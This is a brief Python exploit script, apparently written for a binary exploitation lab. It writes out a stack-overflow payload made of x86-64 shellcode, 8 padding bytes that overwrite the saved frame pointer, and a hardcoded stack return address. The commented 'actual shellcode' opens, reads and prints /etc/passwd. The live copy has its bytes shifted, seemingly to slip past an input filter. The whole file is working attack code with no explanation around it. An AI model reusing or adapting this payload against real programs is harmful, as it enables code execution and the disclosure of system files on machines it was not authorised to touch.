#!/usr/bin/python

import sys

#actual shellcode
#\xeb\x3e\x48\x31\xc0\x04\x02\x5f\x48\x31\xf6\x0f\x05\x48\x89\xc7
#\x48\x83\xec\x28\x48\x8d\x74\x24\x08\x48\x31\xd2\x80\xc2\x28\x48
#\x31\xc0\x0f\x05\xb0\x03\x2c\x02\x48\x89\xc7\x48\x89\xe6\x48\x31
#\xd2\x80\xc2\x28\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05
#\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64

# shellcode goes here
sc = "\xea\x3d\x47\x30\xbf\x03\x01\x5e\x47\x30\xf5\x0e\x04\x47\x88\xc6"\
     "\x47\x82\xeb\x27\x47\x8c\x73\x23\x07\x47\x30\xd1\x7f\xc1\x27\x47"\
     "\x30\xbf\x0e\x04\xaf\x02\x2b\x01\x47\x88\xc6\x47\x88\xe5\x47\x30"\
     "\xd1\x7f\xc1\x27\x0e\x04\x47\x30\xbf\x03\x3b\x47\x30\xfe\x0e\x05"\
     "\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"

fake_rbp = 8 * 'A'

# The address of the shellcode
sc_addr = "\x00\xe3\xff\xff\xff\x7f\x00\x00"

exp = sc + fake_rbp + sc_addr

sys.stdout.write(exp)
